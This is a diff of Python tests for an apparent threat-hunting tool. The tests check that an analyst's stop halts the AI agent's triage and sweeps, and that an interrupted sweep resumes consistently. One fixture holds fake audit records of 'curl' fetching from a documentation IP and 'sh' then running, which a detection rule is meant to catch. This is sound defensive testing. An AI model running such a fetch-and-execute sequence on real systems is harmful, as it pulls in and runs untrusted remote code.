@@ -15,6 +15,7 @@ from romulus.hunt import controls
 from romulus.hunt import run as hunt_run
 from romulus.hunt.controls import ControlRefused, HuntStopped
 from romulus.report.markdown import outcome_sentence, stop_sentence
+from romulus.sources.models import Window
 from romulus.store.db import make_engine, migrate, utcnow
 from romulus.store.repo import Repo
 from tests.agent_scripted import ScriptedProvider, response
@@ -553,3 +554,148 @@ def test_added_budget_lets_a_budget_limited_agent_continue_from_its_persisted_wo
     assert "budget:calls" not in (result.reason or "")
     assert repo.agent_hypotheses("h1")[0]["sessions_run"] == 2
     assert repo.agent_usage("h1")["calls"] == 4  # spending persisted across both runs
+
+
+def test_a_stop_during_the_triage_pass_means_no_assessment_call(tmp_path):
+    s = Settings(home=tmp_path)
+    repo = _repo(tmp_path)
+    repo.create_hunt("h1", {"window": {}, "targets": [], "ai_agent": {"requested": True}}, "d", "test")
+    repo.set_hunt_state("h1", "running")
+    repo.set_hunt_state("h1", "completed_within_scope", detection_result="leads_only", stop_reason="scope")
+    repo.save_candidate({
+        "id": "c1", "hunt_id": "h1", "rule_id": "host.test", "rule_version": "1",
+        "claim": "a deterministic process execution finding", "claim_type": "observed_action",
+        "event_ids": [], "context_event_ids": [], "predicate_fields": [],
+        "entities": [["host", "workstation-1", "host"]], "ts": datetime.now(UTC),
+        "severity": "high", "confidence": "high", "lane": "high", "priority": 2.0,
+        "priority_reasons": [], "gate_results": {}, "benign_alternatives": [], "next_checks": [],
+        "group_key": "c1", "source_case_id": None, "source_anchor_id": None, "source_link_id": None})
+    stop = {"detail": None}
+    passes = []
+
+    def triage(_heartbeat, cited=None):
+        passes.append(cited)
+        stop["detail"] = "requested by web:alice"       # the analyst stops it while the pass runs
+        return {"status": "partial", "reason": "budget:stopped"}
+
+    finish = [ToolCall("of", "finish_session", {"summary": "The review of this lead is complete."}, "{}")]
+    # orient, and the session for the hypothesis the controller opens on the finding: then no assessment call
+    provider = ScriptedProvider([response(tool_calls=finish), response(tool_calls=finish)])
+    result = run_agent_phase(s, repo, "h1", provider=provider, toolbox_factory=lambda _s: Toolbox(repo, "h1"),
+                             clock=lambda: 0.0, triage=triage, stop=lambda: stop["detail"])
+    assert passes == [None]                             # the pass ran; its cited-group extension did not
+    assert not [r for r in provider.requests if r.schema_name == "ai-assessment@1"]
+    assert STOPPED_REASON in result.reason
+    assert repo.agent_assessments("h1")[-1]["source"] == "template"
+
+
+def test_the_triage_budget_starts_no_call_after_a_stop():
+    from romulus.agent.provider import AgentStopped
+    from romulus.agent.triage import TriageBudget
+    budget = TriageBudget.from_settings(Settings())
+    budget.check(100, 100)
+    budget.stop = lambda: "requested by web:alice"
+    with pytest.raises(AgentStopped) as stopped:
+        budget.check(100, 100)
+    assert stopped.value.budget == "stopped"
+
+
+def test_a_refused_resume_never_replaces_the_live_workers_record(tmp_path, monkeypatch):
+    from romulus import cli
+    s = Settings(home=tmp_path)
+    repo = _repo(tmp_path)
+    _hunt(repo, s)
+    owner = repo.claim_hunt("h1", 600)["lease_owner"]
+    repo.audit("system", "hunt.sweep_summary", "h1", {"finished": True, "complete": True}, owner_token=owner)
+    repo.record_hunt_process("h1", pid=4242, start_marker="boot:100", host="node1", command="hunt start")
+    monkeypatch.setattr(cli, "_settings", lambda _args: s)
+    monkeypatch.setattr(hunt_run, "open_repo", lambda _s: repo)
+    for name in ("ensure_site_unchanged", "install_for_hunt"):
+        monkeypatch.setattr(hunt_run, name, lambda *_a, **_k: None)
+    assert cli.main(["hunt", "resume", "h1"]) == cli.EXIT_FAIL       # the live worker holds the lease
+    row = repo.hunt_process("h1")
+    assert row["pid"] == 4242 and row["ended_at"] is None
+
+
+def test_the_agent_never_runs_on_a_hunt_stopped_during_its_sweep(tmp_path):
+    s = Settings(home=tmp_path)
+    repo = _repo(tmp_path)
+    _hunt(repo, s)
+    owner = repo.claim_hunt("h1", 600)["lease_owner"]
+    repo.audit("system", "hunt.sweep_summary", "h1", {"finished": False, "stopped": {"stage": "sweep"}},
+               owner_token=owner)
+    repo.set_hunt_state("h1", "partial", owner_token=owner, stop_reason="stopped by analyst")
+    with pytest.raises(RuntimeError, match="detection finishes"):
+        repo.claim_agent_lease("h1", 600)                # `agent reassess` claims this way
+    with pytest.raises(RuntimeError, match="detection finishes"):
+        repo.claim_triage_lease("h1", 600)               # `romulus triage` too
+    assert repo.agent_reassessment_refusal("h1").startswith("The agent runs only after detection finishes")
+
+
+# ------------------------------------------------------------------------------------------- the sweep run again
+def _two_partition_source(monkeypatch):
+    """Two partitions of Linux audit records: a downloader in the first, the interpreter it feeds in the second (the
+    full pack's sequence, aggregate and baseline rules all read them)."""
+    from tests.test_sweep import START, _complete
+
+    def rec(rid, raw, ts):
+        return {"_id": rid, "_index": "romulus-host-x", "_source": {
+            "@timestamp": ts, "message": raw, "host": {"name": "video"},
+            "event": {"dataset": "linux.audit", "original": raw}}}
+    first = [rec("d1", 'type=EXECVE msg=audit(1731938698.000:7001): argc=2 a0="curl" a1="http://192.0.2.7/x"',
+                 "2024-11-18T14:04:58Z"),
+             rec("d2", 'type=SYSCALL msg=audit(1731938698.000:7001): syscall=59 success=yes ppid=500 pid=501 '
+                       'comm="curl" exe="/usr/bin/curl"', "2024-11-18T14:04:58Z")]
+    second = [rec("s1", 'type=EXECVE msg=audit(1731938701.000:7002): argc=1 a0="sh"', "2024-11-18T14:05:01Z"),
+              rec("s2", 'type=SYSCALL msg=audit(1731938701.000:7002): syscall=59 success=yes ppid=500 pid=502 '
+                        'comm="sh" exe="/usr/bin/dash"', "2024-11-18T14:05:01Z")]
+    from romulus.hunt import sweep as sw
+    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: _complete(
+        intent, first if intent.window.start == START else second))
+    halves = [Window(start=START, end=START + timedelta(minutes=5)),
+              Window(start=START + timedelta(minutes=5), end=START + timedelta(minutes=10))]
+    return sw, halves
+
+
+def _sweep_state(repo):
+    candidates = sorted((c["id"], c["rule_id"], c["lane"], tuple(c["event_ids"]), c["claim"])
+                        for c in repo.candidates("h1"))
+    cells = sorted((c["rule_id"], c["target"], c["partition"], c["state"], c["matched"], c["evaluated"],
+                    repr(c["detail"])) for c in repo.rule_cells("h1"))
+    with repo.engine.connect() as connection:
+        from romulus.store import schema as t
+        tasks = sorted((row.id, row.state) for row in connection.execute(
+            t.task.select().where(t.task.c.hunt_id == "h1")))
+    return candidates, cells, tasks, list(repo.baseline_observations("h1"))
+
+
+def test_a_sweep_stopped_part_way_and_run_again_stores_what_one_uninterrupted_sweep_stores(monkeypatch, tmp_path):
+    from tests.test_sweep import FakeClient
+    from tests.test_sweep import _repo as sweep_repo
+    sw, halves = _two_partition_source(monkeypatch)
+    window = Window(start=halves[0].start, end=halves[1].end)
+
+    fresh = sweep_repo()
+    sweep = sw.Sweep(fresh, FakeClient(), "h1", window, {"x": None}, stage_dir=tmp_path / "fresh")
+    for half in halves:
+        sweep.run_partition("romulus-host-x", None, [], half, est=2)
+    sweep.finalize()
+    expected = _sweep_state(fresh)
+    assert any(row[1] == "host.downloader_feeds_interpreter" for row in expected[0])   # the aggregate published
+    assert expected[3]                                                                  # baseline cells were stored
+
+    stopped = sweep_repo()
+    first = sw.Sweep(stopped, FakeClient(), "h1", window, {"x": None}, stage_dir=tmp_path / "first")
+    requested = iter([None, "requested by web:alice"])
+    first.stop_check = lambda: next(requested)
+    first.run_partition("romulus-host-x", None, [], halves[0], est=2)
+    with pytest.raises(HuntStopped):
+        first.run_partition("romulus-host-x", None, [], halves[1], est=2)
+    first.close_stage()
+    assert not [c for c in stopped.candidates("h1") if c["rule_id"] == "host.downloader_feeds_interpreter"]
+
+    again = sw.Sweep(stopped, FakeClient(), "h1", window, {"x": None}, stage_dir=tmp_path / "again")
+    for half in halves:
+        again.run_partition("romulus-host-x", None, [], half, est=2)
+    again.finalize()
+    assert _sweep_state(stopped) == expected
